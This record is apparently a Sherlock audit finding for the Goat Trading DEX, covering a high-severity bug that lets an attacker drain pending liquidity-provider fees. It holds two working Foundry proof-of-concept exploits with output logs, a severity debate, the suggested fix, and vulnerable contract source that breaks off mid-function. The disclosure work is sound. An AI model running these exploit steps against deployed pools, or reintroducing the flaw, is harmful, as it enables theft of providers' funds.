{
  "Title": "H-1: Liquidity provider fees can be stolen from any pair",
  "Content": "# Issue H-1: Liquidity provider fees can be stolen from any pair \n\nSource: https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/63 \n\n## Found by \nAhmedAdam, C1rdan, zzykxx\n## Summary\nAn attacker can steal the liquidiy providers fees by transfering liquidity tokens to the pair and then withdrawing fees on behalf of the pair itself.\n\n## Vulnerability Detail\n\nThis is possible because of two reasons:\n1. Transfering liquidity tokens to the pair itself [doesn't update the fee tracking variables](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L923-L925):\n\n```solidity\nif (to != address(this)) {\n    _updateFeeRewards(to);\n}\n```\nwhich results in the variable `feesPerTokenPaid[address(pair)]` of the pair being equal to 0.\n\n2. The function [withdrawFees()](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L616) is a permissionless function that allows to withdraw fees on behalf of any address, including the pair itself.\n\nBy combining this two quirks of the codebase an attacker can steal all of the currently pending liquidity provider fees by doing the following:\n\n1. Add liquidity to a pair, which will mint the attacker some liquidity tokens\n2. Transfer the liquidity tokens to the pair directly\n3. Call [withdrawFees()](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L616) by passing the address of the pair. Because `feesPerTokenPaid[address(pair)]` is 0 this will collect fees on behalf of the pair even if it shouldn't. The function will transfer an amount `x` of WETH from the pair to the pair itself and will lower the [_pendingLiquidityFee](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L622C13-L622C34) variable by that same amount \n4. Because the variable `_pendingLiquidityFee` has been lowered by `x` the pool will assume someone transferred `x` WETH to it\n5. At this point the attacker can take advantage of this however he likes, but for the sake of the example let's suppose he calls [swap()](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L242) to swap `x` ETH into tokens that will be transferred to his wallet\n6. The attacker burns the liquidity transferred at point `2` to recover his funds\n\n### POC\n\n<details>\n<summary>Show</summary>\nTo copy-paste in `GoatV1Pair.t.sol`:\n\n```solidity\nfunction testStealFees() public {\n    GoatTypes.InitParams memory initParams;\n    initParams.virtualEth = 10e18;\n    initParams.initialEth = 10e18;\n    initParams.initialTokenMatch = 10e18;\n    initParams.bootstrapEth = 10e18;\n\n    address pairAddress = factory.createPair(address(goat), initParams);\n    address to = users.lp;\n\n    //-> The following block of code:\n    //  1. Creates a pool and immediately converts it into AMM\n    //  2. Skips 31 days to skip the vesting period\n    //  3. Simulates users using the pool by performing a bunch of swaps\n    {\n        //-> 1. A pair is created and immediately converted to an AMM\n        (uint256 tokenAmtForPresale, uint256 tokenAmtForAmm) = GoatLibrary.getTokenAmountsForPresaleAndAmm(\n            initParams.virtualEth, initParams.bootstrapEth, initParams.initialEth, initParams.initialTokenMatch\n        );\n        uint256 bootstrapTokenAmt = tokenAmtForPresale + tokenAmtForAmm;\n\n        _fundMe(IERC20(address(goat)), to, bootstrapTokenAmt);\n        _fundMe(IERC20(address(weth)), to, initParams.initialEth);\n        vm.startPrank(to);\n\n        goat.transfer(pairAddress, bootstrapTokenAmt);\n        weth.transfer(pairAddress, initParams.initialEth);\n        pair = GoatV1Pair(pairAddress);\n        pair.mint(to);\n        vm.stopPrank();\n\n        //-> 2. Skips 31 days to skip the vesting period\n        skip(31 days);\n        \n        //-> 3. Simulates users using the pool by performing a bunch of swaps\n        uint256 reserveEth = 0;\n        uint256 reserveToken = 0;\n        _fundMe(IERC20(address(goat)), to, 100e18);\n        _fundMe(IERC20(address(weth)), to, 100e18);\n        for(uint256 i; i < 100; i++) {\n            (reserveEth, reserveToken) = pair.getReserves();\n            uint256 wethIn = 1e18;\n            uint256 goatOut = GoatLibrary.getTokenAmountOutAmm(wethIn, reserveEth, reserveToken);\n            vm.startPrank(to);\n            weth.transfer(address(pair), wethIn);\n            pair.swap(goatOut, 0, to);\n            vm.stopPrank();\n\n            skip(3); //Avoid MEV restrictions\n\n            (reserveEth, reserveToken) = pair.getReserves();\n            uint256 goatIn = 1e18;\n            uint256 wethOut = GoatLibrary.getWethAmountOutAmm(wethIn, reserveEth, reserveToken);\n            vm.startPrank(to);\n            goat.transfer(address(pair), goatIn);\n            pair.swap(0, wethOut, to);\n            vm.stopPrank();\n        }\n    }\n\n    //-> The pool has some pending liquidity fees\n    uint256 pendingLiquidityFeesBefore = pair.getPendingLiquidityFees();\n    assertEq(pendingLiquidityFeesBefore, 809840958520307912);\n\n    //-> The attacker adds liquidity to the pool \n    address attacker = makeAddr(\"attacker\");\n    (uint256 reserveEth, uint256 reserveToken) = pair.getReserves();\n    uint256 initialGoatAmount = 5.54e18;\n    uint256 initialWethAmount = GoatLibrary.quote(initialGoatAmount, reserveToken, reserveEth);\n    _fundMe(IERC20(address(goat)), attacker, initialGoatAmount);\n    _fundMe(IERC20(address(weth)), attacker, initialWethAmount);\n    vm.startPrank(attacker);\n    goat.transfer(pairAddress, initialGoatAmount);\n    weth.transfer(pairAddress, initialWethAmount);\n    pair.mint(address(attacker));\n    vm.stopPrank();\n\n    //-> Two days needs to be skipped to avoid locking time\n    skip(2 days);\n\n    //-> The attacker does the following:\n    //  -> 1. Transfers the liquidity tokens to the pair\n    //  -> 2. Calls `withdrawFees()` on behalf of the pair which will lower `getPendingLiquidityFees` variables and transfers WETH from the pool to the pool\n    //  -> 3. Swaps the excess WETH in the pool to GOAT tokens\n    //  -> 4. Burns the liquidity he previously transferred to the pair\n    //  -> 5. The attacker profits and LP lose their fees\n    {\n        vm.startPrank(attacker);\n\n        //-> 1. Transfers the liquidity tokens to the pair\n        pair.transfer(address(pair), pair.balanceOf(attacker));\n\n        //-> 2. Calls `withdrawFees()` on behalf of the pair\n        pair.withdrawFees(address(pair));\n\n        //-> An extra amount of WETH equal to the fees withdrawn on behalf of the pool is now in the pool \n        uint256 pendingLiquidityFeesAfter = pair.getPendingLiquidityFees();\n        (uint256 reserveEthCurrent, uint256 reserveTokenCurrent) = pair.getReserves();\n        uint256 extraWethInPool = weth.balanceOf(address(pair)) - reserveEthCurrent - pair.getPendingLiquidityFees() - pair.getPendingProtocolFees();\n        assertEq(pendingLiquidityFeesBefore - pendingLiquidityFeesAfter, extraWethInPool);\n\n        //-> 3. Swaps the excess WETH in the pool to GOAT tokens\n        uint256 goatOut = GoatLibrary.getTokenAmountOutAmm(extraWethInPool, reserveEthCurrent, reserveTokenCurrent);\n        pair.swap(goatOut, 0, attacker);\n\n        //-> 4. Burns the liquidity he previously transferred to the pair\n        pair.burn(attacker);\n\n        //-> 5. The attacker profits and LP lose their fees\n        uint256 attackerWethProfit = weth.balanceOf(attacker) - initialWethAmount;\n        uint256 attackerGoatProfit = goat.balanceOf(attacker) - initialGoatAmount;\n        assertEq(attackerWethProfit, 399855575210658419);\n        assertEq(attackerGoatProfit, 453187161321825804);\n\n        vm.stopPrank();\n    }\n}\n\n```\n</details>\n\n## Impact\n\nLiquidity provider fees can be stolen from any pair.\n\n## Code Snippet\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nIn [withdrawFees(pair)](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L616) add a require statement to prevent fees being withdrawn on behalf of the pool.\n```solidity\nrequire(to != address(this));\n```\n\n\n\n## Discussion\n\n**adamidarrha**\n\nThis issue warrants a HIGH severity rating.\n It demonstrates how any liquidity provider can siphon fees intended for all other liquidity providers. This aligns with the Sherlock Docs criteria for a HIGH issue:\n1. Definite loss of funds without (extensive) limitations of external conditions: \n- The exploit clearly results in the theft of LP fees, with the only requirement being that the attacker holds a portion of the total LP tokens. this doesn't result in any loss for the hacker, and he can do it for any new fees aquired.\n3. Inflicts serious non-material losses (doesn't include contract simply not working):\n- While the core functionality of the protocol may remain intact, the loss of fees represents a significant financial loss for LPs.\n\nthe POC in [ C1rdan - hacker can steal fee from LPs #25 ](https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/25) clearly demonstrates that any LP token holder can steal fees from all other LPs.  This constitutes a direct loss of funds and should be classified as a HIGH severity issue according to Sherlock guidelines.\n\n**Proof Of Concept**\nhere a modified verssion C1rdan POC to show an attacker can steal all fees and not just a portion:\n\n```solidity=\nfunction _setupPair() internal returns(uint256 lpBalance) {\n\n        GoatTypes.InitParams memory initParams;\n        initParams.virtualEth = 10e18;\n        initParams.initialEth = 10e18;\n        initParams.initialTokenMatch = 1000e18;\n        initParams.bootstrapEth = 10e18;\n        uint256 wethAmount = 10e18;\n        _mintInitialLiquidity(initParams, users.lp);\n\n        uint256 fees = (wethAmount * 99) / 10000;\n        uint256 totalLpFees = (fees * 40) / 100;\n        uint256 totalSupply = pair.totalSupply();\n        uint256 feesPerTokenStored = (totalLpFees * 1e18) / totalSupply;\n        lpBalance = pair.balanceOf(users.lp);\n        uint256 lpFees = (feesPerTokenStored * lpBalance) / 1e18;\n\n        feesPerTokenStored = pair.feesPerTokenStored();\n        uint256 earned = pair.earned(users.lp);\n    }\n\n    function _setUpAddress(address user) internal returns (uint wethStart, uint tokenStart) {\n        (uint256 wethR, uint256 tokenR) = pair.getReserves();\n        wethStart = wethR+ 1e18 ;\n        tokenStart= tokenR+ 100e18 ;\n\n        vm.deal(user,wethStart);\n        _fundMe(IERC20(goat), user, tokenStart );\n        vm.prank(user);\n        weth.deposit{value: wethStart}();\n    }\n\n    function testStealFees() public {\n\n        uint256 initialLPBalance = _setupPair();\n \n        address hacker = address(0x1337);\n\n        (uint wethStart, uint tokenStart) = _setUpAddress(hacker);\n\n        // hacker adding Liquidity\n        vm.startPrank(hacker);\n        weth.transfer(address(pair), wethStart - 1e18);\n        goat.transfer(address(pair), tokenStart - 100e18);\n        pair.mint(hacker);\n        vm.stopPrank();\n        uint256 hackerInitialLpBalance = pair.balanceOf(hacker);\n        uint256 hackerInitialWethBalance = weth.balanceOf(hacker);\n\n        // Wait until lock time is over\n        vm.warp(pair.lockedUntil(hacker) + 1);\n        \n        {//give user weth\n        address swappingUser = address(0x002);\n\n        uint256 wethSwap = 1e18;\n        vm.deal(swappingUser, wethSwap);\n\n        vm.startPrank(swappingUser);\n        weth.deposit{value: wethSwap}();\n        \n        // simulate user swaps to add fees to protocol\n        weth.transfer(address(pair), wethSwap);\n\n        (uint wethReserveBefore, uint tokenReserveBefore) = pair.getReserves();\n        uint amountTokenOut = GoatLibrary.getTokenAmountOutAmm(\n            wethSwap,\n            wethReserveBefore,\n          tokenReserveBefore \n        );\n        pair.swap(amountTokenOut, 0, swappingUser);\n        vm.stopPrank();\n        }\n\n        (uint256 reservesWethAfterSwap, ) = pair.getReserves();\n\n        console.log(\"the LPToken balance of the inital LP\", initialLPBalance * 10000 / pair.totalSupply(), \"BPS\");\n        console.log(\"the LPToken balance of the hacker\", hackerInitialLpBalance * 10000 / pair.totalSupply(), \"BPS\");\n        \n        console.log(\"the fees unclaimed by the initial LP:\", pair.earned(users.lp));\n        \n        //the hacker withdraws his fees\n        vm.startPrank(hacker);\n        console.log(\"fees unclaimed by hacker:\", pair.earned(hacker));\n\n        pair.withdrawFees(hacker);\n        console.log(\"fee received by hacker:\", weth.balanceOf(hacker) - hackerInitialWethBalance);\n\n        // Transfer LPs to pair itself\n        pair.transfer(address(pair), hackerInitialLpBalance);\n\n        console.log(\"amount of pending liquidity fees:\", pair.getPendingLiquidityFees());\n        //the hacker withdraws the fees of the pair\n        uint256 feesUnclaimedByPair = pair.earned(address(pair));\n        console.log(\"fees unclaimed by the pair:\", pair.earned(address(pair)));\n        pair.withdrawFees(address(pair));\n        console.log(\"amount of pending liquidity fees after withdrawing fees by the pair\", pair.getPendingLiquidityFees());\n\n        //get hacker tocken amount:\n        {\n            uint256 hackerTokenBalanceBefore = goat.balanceOf(hacker);\n            uint256 hackerWethBalanceBefore = weth.balanceOf(hacker);\n            console.log(\"hacker token balance before:\", hackerTokenBalanceBefore);\n            console.log(\"hacker weth balance before:\", hackerWethBalanceBefore);\n\n            // hacker swaps the stolen weth fee to Tokens.\n            (uint wethReserveBefore, uint tokenReserveBefore) = pair.getReserves();\n            uint amountTokenOut = GoatLibrary.getTokenAmountOutAmm(\n                feesUnclaimedByPair,\n                wethReserveBefore,\n            tokenReserveBefore \n            );\n\n            pair.swap(amountTokenOut, 0, hacker);\n            \n            console.log(\"hacker token balance after swap:\", goat.balanceOf(hacker));\n            console.log(\"hacker weth balance after swap:\", weth.balanceOf(hacker));\n\n            //asseting that the hacker got tokens out of the swap, without providing any weth to the pair\n            assert(hackerTokenBalanceBefore < goat.balanceOf(hacker));\n            assert(hackerWethBalanceBefore == weth.balanceOf(hacker));\n\n            //the hacker burns the lpTokens transfered to the pair so he loses nothing\n            pair.burn(hacker);\n\n            vm.stopPrank();\n        }\n```\n\n1. Attacker deposits liquidity, acquiring 50% of LP tokens.\n2. Initial liquidity provider holds the remaining 50% of LP tokens.\n3. Swaps are simulated, generating fees for all LP holders\n\n### Attack Sequence:\n\n1. Initial Check: Both the attacker and the initial LP have unclaimed fees.\n2. Attacker Withdraws: Attacker withdraws their earned fees.\n3. Attacker transfers to the vault his entire balance\n4. Fees Stolen: Attacker calls withdrawFees on the pair, claiming the accumulated fees and reducing the _pendingLiquidityFees balance.\n5. attacker burns the liquidity he transfered to the pair.\n6. attacker swaps the Eth that was gotten from ther liquidity providers fees, and claimed by the pool\n7. When the initial LP attempts to withdraw fees, the transaction reverts due to insufficient _pendingLiquidityFees\n\n- as this scenario shows any liquidity provider with a portion of LPTokens can steal all the fees of other LP's.\n\nthe output logs:\n```solidity\nthe LPToken balance of the inital LP 4999 BPS\nthe LPToken balance of the hacker 5000 BPS\n\n\nthe fees unclaimed by the initial LP: 1979999999999999\nfees unclaimed by hacker: 1980000000000000\n\nfee received by hacker: 1980000000000000\n\namount of pending liquidity fees: 1980000000000000\n\nfees unclaimed by the pair: 1980000000000000\namount of pending liquidity fees after withdrawing fees by the pair 0\n\nhacker token balance before: 100000000000000000000\nhacker weth balance before: 1001980000000000000\nhacker token balance after swap: 100044491256996732169\nhacker weth balance after swap: 1001980000000000000\n```\n\nmake this issue a high severity.\n\n**zzykxx**\n\nEscalate\n\nThis should be high severity. The POC in my report shows an attacker stealing all currently pending fees from a pool. @adamidarrha also explains why this should be high severity according to the rules.\n\n**sherlock-admin2**\n\n> Escalate\n> \n> This should be high severity. The POC in my report shows an attacker stealing all currently pending fees from a pool. @adamidarrha also explains why this should be high severity according to the rules.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**RobertMCForster**\n\nThis is confirmed as a high severity bug.\n\n**cvetanovv**\n\nFor me, this issue is borderline High/Medium, but I don't think stealing a fee can be High. The values in the example are strongly exaggerated. Most likely, even with minimal accumulation, they will be immediately withdrawn.\n\n**Evert0x**\n\nI believe it should by High severity as the following description applies\n> Definite loss of funds without (extensive) limitations of external conditions.\n\nPlanning to accept escalation and make High severity\n\n**ahmedAdam1337**\n\n@cvetanovv  the issue describes how a liquidity provider can basically gain double his rewards. for example if he had 5% of lpTokens he should get 5% of the rewards, but with this attack path he would be able to get 10%, and it can be done again and again and not just one time, the example we gave is about a lp with 50% can basically gain 100% of the rewards leaving nothing to other lp's.\n\n1. 'I don't think stealing a fee can be High': it's not stealing fees , it's stealing all rewards accrued to liquidity providers, the sole purpose of providing liquidity in a dex pool is to get the swap fees, if lp's dont get their fees they withdraw their liquidity ,no liquidity no swaps.\n\n2. 'The values in the example are strongly exaggerated': the examples provided are with a user holding 50% of lpTokens , which is not unrealistic nor exagerated, but the attack can be carried on with any % of lpTokens.\n\n3. 'Most likely, even with minimal accumulation, they will be immediately withdrawn': fees are gotten from swaps which can happen anytime, lp's arent going to be just withdrawing fees whenever a swap happens. the attacker can also do this attack whenever because it's a 4 step attack (withdrawFees -> transfer lp tokens to vault -> burn tokens (swap) if any left to get out the rewards).\n\nthis is why i think it should be a high.\n\n**Evert0x**\n\nResult:\nHigh\nHas Duplicates\n\n**sherlock-admin3**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [zzykxx](https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/63/#issuecomment-2041352625): accepted\n\n**FastTiger777**\n\nI think this is medium. As the following language fits the impact the best.\n\n> V. How to identify a medium issue:\n Breaks core contract functionality, rendering the contract useless or leading to loss of funds.\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/178",
  "Code": [
    {
      "filename": "goat-trading/contracts/exchange/GoatV1Pair.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.19;\n\n// library imports\nimport {IERC20Metadata} from \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\";\nimport {SafeERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport {ReentrancyGuard} from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport {Math} from \"@openzeppelin/contracts/utils/math/Math.sol\";\n\n// local imports\nimport {GoatErrors} from \"../library/GoatErrors.sol\";\nimport {GoatTypes} from \"../library/GoatTypes.sol\";\nimport {GoatV1ERC20} from \"./GoatV1ERC20.sol\";\n\n// interfaces\nimport {IGoatV1Factory} from \"../interfaces/IGoatV1Factory.sol\";\n\n/**\n * @title Goat Trading V1 Pair\n * @notice Main contract for Goat Trading V1 and should be called from contract with safety checks.\n * @dev This contract is a pair of two tokens that are traded against each other.\n *  The pair is deployed by the factory contract.\n * Mint, Burn, Swap, and Takeover are handled in this contract.\n * @author Goat Trading -- Chiranjibi Poudyal, Robert M.C. Forster\n */\ncontract GoatV1Pair is GoatV1ERC20, ReentrancyGuard {\n    using SafeERC20 for IERC20;\n\n    uint256 public constant MINIMUM_LIQUIDITY = 10 ** 3;\n    uint32 private constant _MIN_LOCK_PERIOD = 2 days;\n    uint32 public constant VESTING_PERIOD = 7 days;\n    uint32 private constant _MAX_UINT32 = type(uint32).max;\n    uint32 private constant _THIRTY_DAYS = 30 days;\n\n    address public immutable factory;\n    uint32 private immutable _genesis;\n    // Figure out a way to use excess 12 bytes in here to store something\n    address private _token;\n    address private _weth;\n\n    uint112 private _virtualEth;\n    uint112 private _initialTokenMatch;\n    uint32 private _vestingUntil;\n\n    // this is the real amount of eth in the pool\n    uint112 private _reserveEth;\n    // token reserve in the pool\n    uint112 private _reserveToken;\n    // variable used to check for mev\n    uint32 private _lastTrade;\n\n    // Amounts of eth needed to turn pool into an amm\n    uint112 private _bootstrapEth;\n    // total lp fees that are not withdrawn\n    uint112 private _pendingLiquidityFees;\n\n    // Fees per token scaled by 1e18\n    uint184 public feesPerTokenStored;\n    // Can store >4500 ether which is more than enough\n    uint72 private _pendingProtocolFees;\n\n    mapping(address => uint256) private _presaleBalances;\n    mapping(address => uint256) public lpFees;\n    mapping(address => uint256) public feesPerTokenPaid;\n\n    GoatTypes.InitialLPInfo private _initialLPInfo;\n\n    event Mint(address, uint256, uint256);\n    event Burn(address, uint256, uint256, address);\n    event Swap(address, uint256, uint256, uint256, uint256, address);\n\n    constructor() {\n        factory = msg.sender;\n        _genesis = uint32(block.timestamp);\n    }\n\n    /* ----------------------------- EXTERNAL FUNCTIONS ----------------------------- */\n    function initialize(address token, address weth, string memory baseName, GoatTypes.InitParams memory params)\n        external\n    {\n        if (msg.sender != factory) revert GoatErrors.GoatV1Forbidden();\n        _token = token;\n        _weth = weth;\n        // setting non zero value so that swap will not incur new storage write on update\n        _vestingUntil = _MAX_UINT32;\n        // Is there a token without a name that may result in revert in this case?\n        string memory tokenName = IERC20Metadata(_token).name();\n        name = string(abi.encodePacked(\"GoatTradingV1: \", baseName, \"/\", tokenName));\n        symbol = string(abi.encodePacked(\"GoatV1-\", baseName, \"-\", tokenName));\n        _initialTokenMatch = params.initialTokenMatch;\n        _virtualEth = params.virtualEth;\n        _bootstrapEth = params.bootstrapEth;\n    }\n\n    /**\n     * @notice Should be called from a contract with safety checks\n     * @notice Mints liquidity tokens in exchange for ETH and tokens deposited into the pool.\n     * @dev This function allows users to add liquidity to the pool,\n     *      receiving liquidity tokens in return. It includes checks for\n     *      the presale period and calculates liquidity based on virtual amounts at presale\n     *      and deposited ETH and tokens when it's an amm.\n     * @param to The address to receive the minted liquidity tokens.\n     * @return liquidity The amount of liquidity tokens minted.\n     * Requirements:\n     * - Cannot add liquidity during the presale period if the total supply is greater than 0.\n     * - The amount of ETH deposited must not exceed the bootstrap ETH amount on first mint.\n     * - Ensures the deposited token amount matches the required amount for liquidity bootstrapping.\n     * Emits:\n     * - A `Mint` event with details for the mint transaction.\n     * Security:\n     * - Uses `nonReentrant` modifier to prevent reentrancy attacks.\n     */\n    function mint(address to) external nonReentrant returns (uint256 liquidity) {\n        uint256 totalSupply_ = totalSupply();\n        uint256 amountWeth;\n        uint256 amountToken;\n        uint256 balanceEth = IERC20(_weth).balanceOf(address(this));\n        uint256 balanceToken = IERC20(_token).balanceOf(address(this));\n\n        GoatTypes.LocalVariables_MintLiquidity memory mintVars;\n\n        mintVars.virtualEth = _virtualEth;\n        mintVars.initialTokenMatch = _initialTokenMatch;\n        mintVars.bootstrapEth = _bootstrapEth;\n\n        if (_vestingUntil == _MAX_UINT32) {\n            // Do not allow to add liquidity in presale period\n            if (totalSupply_ > 0) revert GoatErrors.PresalePeriod();\n            // don't allow to send more eth than bootstrap eth\n            if (balanceEth > mintVars.bootstrapEth) {\n                revert GoatErrors.SupplyMoreThanBootstrapEth();\n            }\n\n            if (balanceEth < mintVars.bootstrapEth) {\n                (uint256 tokenAmtForPresale, uint256 tokenAmtForAmm) = _tokenAmountsForLiquidityBootstrap(\n                    mintVars.virtualEth, mintVars.bootstrapEth, balanceEth, mintVars.initialTokenMatch\n                );\n                if (balanceToken != (tokenAmtForPresale + tokenAmtForAmm)) {\n                    revert GoatErrors.InsufficientTokenAmount();\n                }\n                liquidity =\n                    Math.sqrt(uint256(mintVars.virtualEth) * uint256(mintVars.initialTokenMatch)) - MINIMUM_LIQUIDITY;\n            } else {\n                // This means that user is willing to make this pool an amm pool in first liquidity mint\n                liquidity = Math.sqrt(balanceEth * balanceToken) - MINIMUM_LIQUIDITY;\n                uint32 timestamp = uint32(block.timestamp);\n                _vestingUntil = timestamp + VESTING_PERIOD;\n            }\n            mintVars.isFirstMint = true;\n        } else {\n            // at this point in time we will get the actual reserves\n            (uint256 reserveEth, uint256 reserveToken) = getReserves();\n            amountWeth = balanceEth - reserveEth - _pendingLiquidityFees - _pendingProtocolFees;\n            amountToken = balanceToken - reserveToken;\n            liquidity = Math.min((amountWeth * totalSupply_) / reserveEth, (amountToken * totalSupply_) / reserveToken);\n        }\n\n        // @note can this be an attack area to grief initial lp by using to as initial lp?\n        if (mintVars.isFirstMint || to == _initialLPInfo.liquidityProvider) {\n            _updateInitialLpInfo(liquidity, balanceEth, to, false, false);\n        }\n        if (!mintVars.isFirstMint) _updateFeeRewards(to);\n\n        if (totalSupply_ == 0) {\n            _mint(address(0), MINIMUM_LIQUIDITY);\n        }\n\n        _mint(to, liquidity);\n\n        _update(balanceEth, balanceToken, true);\n\n        emit Mint(msg.sender, amountWeth, amountToken);\n    }\n\n    /**\n     * @notice Should be called from a contract with safety checks\n     * @notice Burns liquidity tokens to remove liquidity from the pool and withdraw ETH and tokens.\n     * @dev This function allows liquidity providers to burn their liquidity\n     *         tokens in exchange for the underlying assets (ETH and tokens).\n     *         It updates the initial liquidity provider information,\n     *         applies fee rewards, and performs necessary state updates.\n     * @param to The address to which the withdrawn ETH and tokens will be sent.\n     * @return amountWeth The amount of WETH withdrawn from the pool.\n     * @return amountToken The amount of tokens withdrawn from the pool.\n     * Reverts:\n     * - If the function is called by the initial liquidity provider during the presale period.\n     * Emits:\n     * - A `Burn` event with necessary details of the burn.\n     */\n    function burn(address to) external returns (uint256 amountWeth, uint256 amountToken) {\n        uint256 liquidity = balanceOf(address(this));\n\n        // initial lp can bypass this check by using different\n        // to address so _lastPoolTokenSender is used\n        if (_vestingUntil == _MAX_UINT32) revert GoatErrors.PresalePeriod();\n\n        uint256 totalSupply_ = totalSupply();\n        amountWeth = (liquidity * _reserveEth) / totalSupply_;\n        amountToken = (liquidity * _reserveToken) / totalSupply_;\n        if (amountWeth == 0 || amountToken == 0) {\n            revert GoatErrors.InsufficientLiquidityBurned();\n        }\n\n        _updateFeeRewards(to);\n        _burn(address(this), liquidity);\n\n        // Transfer liquidity tokens to the user\n        IERC20(_weth).safeTransfer(to, amountWeth);\n        IERC20(_token).safeTransfer(to, amountToken);\n        uint256 balanceEth = IERC20(_weth).balanceOf(address(this));\n        uint256 balanceToken = IERC20(_token).balanceOf(address(this));\n\n        _update(balanceEth, balanceToken, true);\n\n        emit Burn(msg.sender, amountWeth, amountToken, to);\n    }\n\n    /**\n     * @notice Should be called from a contract with safety checks\n     * @notice Executes a swap from ETH to tokens or tokens to ETH.\n     * @dev This function handles the swapping logic, including MEV\n     *  checks, fee application, and updating reserves.\n     * @param amountTokenOut The amount of tokens to be sent out.\n     * @param amountWethOut The amount of WETH to be sent out.\n     * @param to The address to receive the output of the swap.\n     * Requirements:\n     * - Either `amountTokenOut` or `amountWethOut` must be greater than 0, but not both.\n     * - The output amount must not exceed the available reserves in the pool.\n     * - If the swap occurs in vesting period (presale included),\n     *   it updates the presale balance for the buyer.\n     * - Applies fees and updates reserves accordingly.\n     * - Ensures the K invariant holds after the swap,\n     *   adjusting for virtual reserves during the presale period.\n     * - Transfers the specified `amountTokenOut` or `amountWethOut` to the address `to`.\n     * - In case of a presale swap, adds LP fees to the reserve ETH.\n     * Emits:\n     * - A `Swap` event with details about the amounts swapped.\n     * Security:\n     * - Uses `nonReentrant` modifier to prevent reentrancy attacks.\n     */\n    function swap(uint256 amountTokenOut, uint256 amountWethOut, address to) external nonReentrant {\n        if (amountTokenOut == 0 && amountWethOut == 0) {\n            revert GoatErrors.InsufficientOutputAmount();\n        }\n        if (amountTokenOut != 0 && amountWethOut != 0) {\n            revert GoatErrors.MultipleOutputAmounts();\n        }\n        GoatTypes.LocalVariables_Swap memory swapVars;\n        swapVars.isBuy = amountWethOut > 0 ? false : true;\n        // check for mev\n        _handleMevCheck(swapVars.isBuy);\n\n        (swapVars.initialReserveEth, swapVars.initialReserveToken) = _getActualReserves();\n\n        if (amountTokenOut > swapVars.initialReserveToken || amountWethOut > swapVars.initialReserveEth) {\n            revert GoatErrors.InsufficientAmountOut();\n        }\n\n        if (swapVars.isBuy) {\n            swapVars.amountWethIn = IERC20(_weth).balanceOf(address(this)) - swapVars.initialReserveEth\n                - _pendingLiquidityFees - _pendingProtocolFees;\n            // optimistically send tokens out\n            IERC20(_token).safeTransfer(to, amountTokenOut);\n        } else {\n            swapVars.amountTokenIn = IERC20(_token).balanceOf(address(this)) - swapVars.initialReserveToken;\n            // optimistically send weth out\n            IERC20(_weth).safeTransfer(to, amountWethOut);\n        }\n        swapVars.vestingUntil = _vestingUntil;\n        swapVars.isPresale = swapVars.vestingUntil == _MAX_UINT32;\n\n        (swapVars.feesCollected, swapVars.lpFeesCollected) =\n            _handleFees(swapVars.amountWethIn, amountWethOut, swapVars.isPresale);\n\n        swapVars.tokenAmount = swapVars.isBuy ? amountTokenOut : swapVars.amountTokenIn;\n\n        // We store details of participants so that we only allow users who have\n        // swap back tokens who have bought in the vesting period.\n        if (swapVars.vestingUntil > block.timestamp) {\n            _updatePresale(to, swapVars.tokenAmount, swapVars.isBuy);\n        }\n\n        if (swapVars.isBuy) {\n            swapVars.amountWethIn -= swapVars.feesCollected;\n        } else {\n            unchecked {\n                amountWethOut += swapVars.feesCollected;\n            }\n        }\n        swapVars.finalReserveEth = swapVars.isBuy\n            ? swapVars.initialReserveEth + swapVars.amountWethIn\n            : swapVars.initialReserveEth - amountWethOut;\n        swapVars.finalReserveToken = swapVars.isBuy\n            ? swapVars.initialReserveToken - amountTokenOut\n            : swapVars.initialReserveToken + swapVars.amountTokenIn;\n\n        swapVars.bootstrapEth = _bootstrapEth;\n        // presale lp fees should go to reserve eth\n        if (swapVars.isPresale && ((swapVars.finalReserveEth + swapVars.lpFeesCollected) > swapVars.bootstrapEth)) {\n            // at this point pool should be changed to an AMM\n            _checkAndConvertPool(swapVars.finalReserveEth + swapVars.lpFeesCollected, swapVars.finalReserveToken);\n        } else {\n            // check for K\n\n            (swapVars.virtualEthReserveBefore, swapVars.virtualTokenReserveBefore) =\n                _getReserves(swapVars.vestingUntil, swapVars.initialReserveEth, swapVars.initialReserveToken);\n            (swapVars.virtualEthReserveAfter, swapVars.virtualTokenReserveAfter) =\n                _getReserves(swapVars.vestingUntil, swapVars.finalReserveEth, swapVars.finalReserveToken);\n            if (\n                swapVars.virtualEthReserveBefore * swapVars.virtualTokenReserveBefore\n                    > swapVars.virtualEthReserveAfter * swapVars.virtualTokenReserveAfter\n            ) {\n                revert GoatErrors.KInvariant();\n            }\n        }\n\n        if (swapVars.isPresale) {\n            swapVars.finalReserveEth += swapVars.lpFeesCollected;\n        }\n        _update(swapVars.finalReserveEth, swapVars.finalReserveToken, false);\n\n        emit Swap(\n            msg.sender,\n            swapVars.amountWethIn + swapVars.feesCollected,\n            swapVars.amountTokenIn,\n            amountWethOut,\n            amountTokenOut,\n            to\n        );\n    }\n\n    /**\n     * @notice Synchronizes the reserves of the pool with the current balances.\n     * @dev This function updates the reserves to reflect the current reserve of WETH and token\n     */\n    function sync() external nonReentrant {\n        uint256 tokenBalance = 